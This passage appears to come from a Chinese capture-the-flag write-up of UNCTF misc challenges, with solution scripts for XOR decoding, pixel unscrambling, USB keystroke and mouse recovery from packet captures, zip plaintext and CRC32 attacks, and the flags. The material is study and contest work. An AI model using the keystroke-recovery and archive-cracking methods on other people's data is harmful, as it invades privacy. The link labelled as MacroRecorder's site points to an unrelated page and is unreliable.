xortool</code>，pip3或者pip都可以，只要你能安装这个库到你的python3上就可以。</p><p>使用<code>xortool.exe -c 00 dat</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117203904521.png" alt="image-20221117203904521"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117203929800.png" alt="image-20221117203929800"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117203947593.png" alt="image-20221117203947593"></p><p>这个<code>0.out</code>打开一看你会发现就是zip的了，这个<code>xortool</code>会自动帮你进行检测然后保存。</p><p><code>-c 00 一般软件或者文件使用， -c 20 一般是文本文件使用</code></p><ol start="3"><li>我当时没有使用xortool，所以我使用010editor对文件进行二进制异或，操作如下：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163232471.png" alt="image-20221117163232471"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163252591.png" alt="image-20221117163252591"></p><p>无符号字节，操作数8e，十六进制，确定。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163318213.png" alt="image-20221117163318213"></p><p>一看就是zip了，修改备注为zip，没有密码，解压得到<code>encode.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="keyword">as</span> im</span><br><span class="line"></span><br><span class="line">flag = im.<span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h=flag.size</span><br><span class="line">puzzle=im.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="built_in">print</span>(puzzle)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        r,g,b=flag.getpixel((i,j))</span><br><span class="line">        r=r^g</span><br><span class="line">        g=g^b</span><br><span class="line">        b=b^r</span><br><span class="line">        puzzle.putpixel(((i*<span class="number">787</span>+j)//<span class="number">1200</span>,(i*<span class="number">787</span>+j)%<span class="number">1200</span>),(b,g,r))</span><br><span class="line">puzzle.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">flag.close()</span><br><span class="line">puzzle.close()</span><br></pre></td></tr></table></figure><p>根据加密流程写一个解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;bgr.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">            b, g, r = img.getpixel((x, y))</span><br><span class="line">            b = b ^ r</span><br><span class="line">            g = g ^ b</span><br><span class="line">            r = r ^ g</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;b&#125;</span> <span class="subst">&#123;g&#125;</span> <span class="subst">&#123;r&#125;</span>&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果你实在不知道为什么要向上面那样写解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是刚刚的加密，解密的脚本</span></span><br><span class="line">r, g, b = <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">r = r ^ g</span><br><span class="line">g = g ^ b</span><br><span class="line">b = b ^ r</span><br><span class="line"><span class="built_in">print</span>(r, g, b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">b = b ^ r</span><br><span class="line">g = g ^ b</span><br><span class="line">r = r ^ g</span><br><span class="line"><span class="built_in">print</span>(r, g, b)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">7 1 2</span><br><span class="line">3 4 5</span><br></pre></td></tr></table></figure><p>所以说有时候加密流程搞不懂，你就写个demo试试。</p><p>运行解密脚本后，会得到一个<code>bgr.txt</code>文件</p><p>运行该脚本之前，手动新建一个<code>images</code>的文件夹，因为我这个脚本会把图片写入的<code>images</code>的文件夹里面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;bgr.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">img = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    img.append(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), line.split(<span class="string">&quot; &quot;</span>))))</span><br><span class="line">img = np.array(img, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> width, height <span class="keyword">in</span> &#123;<span class="number">1</span>: <span class="number">944400</span>, <span class="number">2</span>: <span class="number">472200</span>, <span class="number">3</span>: <span class="number">314800</span>, <span class="number">4</span>: <span class="number">236100</span>, <span class="number">5</span>: <span class="number">188880</span>, <span class="number">6</span>: <span class="number">157400</span>, <span class="number">8</span>: <span class="number">118050</span>, <span class="number">10</span>: <span class="number">94440</span>, <span class="number">12</span>: <span class="number">78700</span>, <span class="number">15</span>: <span class="number">62960</span>, <span class="number">16</span>: <span class="number">59025</span>, <span class="number">20</span>: <span class="number">47220</span>, <span class="number">24</span>: <span class="number">39350</span>, <span class="number">25</span>: <span class="number">37776</span>, <span class="number">30</span>: <span class="number">31480</span>, <span class="number">40</span>: <span class="number">23610</span>, <span class="number">48</span>: <span class="number">19675</span>, <span class="number">50</span>: <span class="number">18888</span>, <span class="number">60</span>: <span class="number">15740</span>, <span class="number">75</span>: <span class="number">12592</span>, <span class="number">80</span>: <span class="number">11805</span>, <span class="number">100</span>: <span class="number">9444</span>, <span class="number">120</span>: <span class="number">7870</span>, <span class="number">150</span>: <span class="number">6296</span>, <span class="number">200</span>: <span class="number">4722</span>, <span class="number">240</span>: <span class="number">3935</span>, <span class="number">300</span>: <span class="number">3148</span>, <span class="number">400</span>: <span class="number">2361</span>, <span class="number">600</span>: <span class="number">1574</span>, <span class="number">787</span>: <span class="number">1200</span>, <span class="number">1200</span>: <span class="number">787</span>, <span class="number">1574</span>: <span class="number">600</span>, <span class="number">2361</span>: <span class="number">400</span>, <span class="number">3148</span>: <span class="number">300</span>, <span class="number">3935</span>: <span class="number">240</span>, <span class="number">4722</span>: <span class="number">200</span>, <span class="number">6296</span>: <span class="number">150</span>, <span class="number">7870</span>: <span class="number">120</span>, <span class="number">9444</span>: <span class="number">100</span>, <span class="number">11805</span>: <span class="number">80</span>, <span class="number">12592</span>: <span class="number">75</span>, <span class="number">15740</span>: <span class="number">60</span>, <span class="number">18888</span>: <span class="number">50</span>, <span class="number">19675</span>: <span class="number">48</span>, <span class="number">23610</span>: <span class="number">40</span>, <span class="number">31480</span>: <span class="number">30</span>, <span class="number">37776</span>: <span class="number">25</span>, <span class="number">39350</span>: <span class="number">24</span>, <span class="number">47220</span>: <span class="number">20</span>, <span class="number">59025</span>: <span class="number">16</span>, <span class="number">62960</span>: <span class="number">15</span>, <span class="number">78700</span>: <span class="number">12</span>, <span class="number">94440</span>: <span class="number">10</span>, <span class="number">118050</span>: <span class="number">8</span>, <span class="number">157400</span>: <span class="number">6</span>, <span class="number">188880</span>: <span class="number">5</span>, <span class="number">236100</span>: <span class="number">4</span>, <span class="number">314800</span>: <span class="number">3</span>, <span class="number">472200</span>: <span class="number">2</span>&#125;.items():</span><br><span class="line">    img = img.reshape(height, width, <span class="number">3</span>)</span><br><span class="line">    cv2.imwrite(<span class="string">f&quot;./images/<span class="subst">&#123;width&#125;</span>_<span class="subst">&#123;height&#125;</span>.png&quot;</span>, img)</span><br></pre></td></tr></table></figure><p>images目录下面出现了很多的图片了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163804963.png" alt="image-20221117163804963"></p><p>我们肉眼可以看到<code>1200x787.png</code>是一张完美的图片，我们打开后，左转90°，再垂直翻转一下，就得到了flag。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117163903056.png" alt="image-20221117163903056"></p><p><strong>UNCTF{93bb442f-2a76-2b6f-c42f-c2297f5fdaf9}</strong></p><p><strong>补充：</strong></p><p>我是如何得到那些宽高的？</p><p><code>bgr.txt</code> 一共有944400个像素点，我们就找能被整除的数，也就是假设一个width，如果944400 % width &#x3D;&#x3D; 0，那你们能被整除，那它们就有可能是真实的宽度和高度。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117195638476.png" alt="image-20221117195638476"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">    N = 61366</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输出：</span></span><br><span class="line"><span class="string">    &#123;1: 61366, 2: 30683, 61: 1006, 122: 503, 503: 122, 1006: 61, 30683: 2&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#123;X1: Y1, X2: Y2, ..., Xn: Yn&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入数字&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = args.t</span><br><span class="line">ret = &#123;X: <span class="built_in">int</span>(N / X) <span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N) <span class="keyword">if</span> N % X == <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;一共有 <span class="subst">&#123;<span class="built_in">len</span>(ret)&#125;</span> 种情况:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117195936402.png" alt="image-20221117195936402"></p><br><h1 id="13-CatchJerry-华中科技大学"><a href="#13-CatchJerry-华中科技大学" class="headerlink" title="13.CatchJerry-华中科技大学"></a>13.CatchJerry-华中科技大学</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题干：</span><br><span class="line">Tom和Jerry是一对欢喜冤家，这天Jerry偷走了芝士，Tom需要把他抓回来。</span><br><span class="line">Jerry一会跳到屏幕上，一会跳到键盘上，Tom很是头晕。</span><br><span class="line">你能帮助Tom看清Jerry的踪迹吗？</span><br><span class="line">说明：</span><br><span class="line">flag内容由若干大写英文单词组成，单词间以&quot;_&quot;间隔，flag格式：UNCTF&#123;解出的字符串&#125;</span><br></pre></td></tr></table></figure><ol><li>下载文件后，得到了一个流量包，打开分析了一下基本都是usb流量。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤命令：tshark.exe -r .\CatchJerry.pcapng -Y &quot;usbhid.data&quot; -T fields -e usbhid.data &gt; out.txt</span><br></pre></td></tr></table></figure><p><strong>out.txt:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000</span><br><span class="line">0000010000000100</span><br><span class="line">0000010000000100</span><br><span class="line">0000020000000200</span><br><span class="line">0000010000000100</span><br><span class="line">0000020000000200</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用代码把这个数据转换为鼠标的坐标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    keys = f.read().splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;LEFT.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> left, <span class="built_in">open</span>(<span class="string">&quot;RIGHT.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> right, <span class="built_in">open</span>(<span class="string">&quot;ALL.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> <span class="built_in">all</span>:</span><br><span class="line">    posx, posy = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        x = <span class="built_in">int</span>(line[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">        y = <span class="built_in">int</span>(line[<span class="number">5</span>:<span class="number">7</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">127</span>:</span><br><span class="line">            x -= <span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">115</span>:</span><br><span class="line">            y -= <span class="number">256</span></span><br><span class="line">        posx += x</span><br><span class="line">        posy += y</span><br><span class="line">        <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">        btn_flag = <span class="built_in">int</span>(line[:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> btn_flag == <span class="number">1</span>:  <span class="comment"># 1 代表左键，2代表右键</span></span><br><span class="line">            left.write(<span class="string">f&#x27;<span class="subst">&#123;posx&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(-posy)&#125;</span>&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> btn_flag == <span class="number">2</span>:</span><br><span class="line">            right.write(<span class="string">f&#x27;<span class="subst">&#123;posx&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(-posy)&#125;</span>&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">all</span>.write(<span class="string">f&#x27;<span class="subst">&#123;posx&#125;</span> <span class="subst">&#123;<span class="built_in">str</span>(-posy)&#125;</span>&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到3个文件分别是<code>ALL.TXT</code>, <code>LEFT.txt</code>, <code>RIGHT.txt</code>，<code>RIGHT.txt</code>没有内容，也就是说没有右键的流量。</p><p>复制<code>LEFT.txt</code>到kali中，安装<code>gnuplot</code>，不会安装的百度一下。</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117164524693.png" alt="image-20221117164524693"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_10-51-24.png" alt="Snipaste_2022-11-17_10-51-24"></p><p>得到关键字：<code>TOM</code>，<code>JERRY</code>，<code>FRIENDS</code></p><p>根据题干所以还有flag在键盘流量里面，但是我们如果在<code>wireshark</code>中过滤器用<code>usb.capdata</code>，你会发现没有任何流量，所以说键盘的流量也在<code>usbhid.data</code>里面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据 USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节，刚好所有数据都是八字节。</span><br><span class="line">击键信息集中在第3个字节，每次击键都会产生一个数据包。</span><br><span class="line">所以下面的代码就是读取第3个字节，然后输出键盘按键的信息。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().splitlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    num = <span class="built_in">int</span>(i[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">in</span> mappings:</span><br><span class="line">        <span class="built_in">print</span>(mappings[num], end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117164835273.png" alt="image-20221117164835273"></p><p>得到关键字：<code>AND</code>，<code>BEST</code></p><p>所以flag为：</p><p><strong>UNCTF{TOM_AND_JERRY_BEST_FRIENDS}</strong></p><br><h1 id="14-贝斯家族的侵略-中国地质大学武汉"><a href="#14-贝斯家族的侵略-中国地质大学武汉" class="headerlink" title="14.贝斯家族的侵略-中国地质大学武汉"></a>14.贝斯家族的侵略-中国地质大学武汉</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提示1：如果明文攻击失败，尝试使用bandzip</span><br><span class="line">提示2：会动的鼠标</span><br></pre></td></tr></table></figure><ol><li>使用bandzip，极限压缩然后明文攻击。</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/1.%E6%94%BB%E5%87%BBkey.jpg" alt="1.攻击key"></p><p>得到密码：<code>b4s31sN1ce</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/2.%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81.jpg" alt="2.读取密码"></p><ol start="2"><li>解压文件，打开<code>flag</code>的文件</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117192220149.png" alt="image-20221117192220149"></p><p>一堆base64，base64隐写了，用我的软件也可以，因为软件偷懒没写多线程，然后这个base64文本又比较多，所以会出现卡死，但是并不是真的死了，需要稍微等一会，Github链接：<a href="https://github.com/Byxs20/Base64-Tools%EF%BC%8C%E6%89%93%E5%BC%80%E5%90%8E%E5%9C%A8%E5%8F%B3%E8%BE%B9%E7%9A%84Release%E4%B8%8B%E8%BD%BD%E3%80%82">https://github.com/Byxs20/Base64-Tools，打开后在右边的Release下载。</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117192944355.png" alt="image-20221117192944355"></p><p>复制下面的然后粘贴到CyberChef上面</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_19-32-51.png" alt="Snipaste_2022-11-17_19-32-51"></p><p>然后保存这个文件保存下来</p><p>这个时候，就开始难起来了，<code>Macro</code>翻译是宏，<code>.mrd</code>这个格式找了半天也没找到啥软件。</p><p>不过我的思路就是肯定是一款软件，而且他是鼠标宏的，因为<code>提示2：会动的鼠标</code>，鼠标和宏一起，就是鼠标宏，鼠标宏才会动，鼠标是不会莫名其妙的移动的。</p><p>现在就是必须要找到那款软件。</p><p>最终下载了一款叫<code>MacroRecorder</code>的软件，官网链接：<a href="https://www.dcode.fr/solveur-sudoku">https://www.dcode.fr/solveur-sudoku</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194152595.png" alt="image-20221117194152595"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194244437.png" alt="image-20221117194244437"></p><p>打开<code>Macro.mrd</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194425357.png" alt="image-20221117194425357"></p><p>这个时候打开画图软件，点一下Play</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194459247.png" alt="image-20221117194459247"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221117194539979.png" alt="image-20221117194539979"></p><p>你的鼠标就会变成移动的鼠标喽~嘎嘎乱动</p><p><strong>UNCTF{b4s3_1s_v3ry_g0od!!}</strong></p><br><h1 id="15-峰回路转-内蒙古警察职业学院"><a href="#15-峰回路转-内蒙古警察职业学院" class="headerlink" title="15.峰回路转-内蒙古警察职业学院"></a>15.峰回路转-内蒙古警察职业学院</h1><p>这个时候距离比赛还有4小时左右，我一觉睡醒，这题0解变成2解，我一看就知道排名掉了，果然20名开外，然后我就硬肝这题了，还好肝出来了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示1：带密码的eye</span><br></pre></td></tr></table></figure><ol><li>这两个文件，肯定是可以crc32爆破的，我用的是我开源项目：<a href="https://github.com/Byxs20/zip-crc-tools">Byxs20&#x2F;zip-crc-tools</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118100047227.png" alt="image-20221118100047227"></p><p>如果使用我的项目的话，需要手动去添加一些字符集，添加字符集，才可被爆破出来，不然爆破不出来；另外这个crc32的项目也是需要手动下载的，详细看我github项目的食用教程！</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221118100500353.png" alt="image-20221118100500353"></p><p>配置好后，运行效果如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/Snipaste_2022-11-17_11-19-09.png" alt="Snipaste_2022-11-17_11-19-09"></p><p><code>2.txt</code>对应<code>W0RD</code>，<code>3.txt</code>对应<code>P@Ss</code>，组合一起就是<code>W0RDP@Ss</code>，去解压这个zip，没成功。</p><p>然后我把顺序换了一下，使用<code>P@SsW0RD</code>这个密码解压就成功了！</p><ol start="2"><li>这个图片的隐写完全就是多尝试了，我也是试了好久。</li></ol><p><img 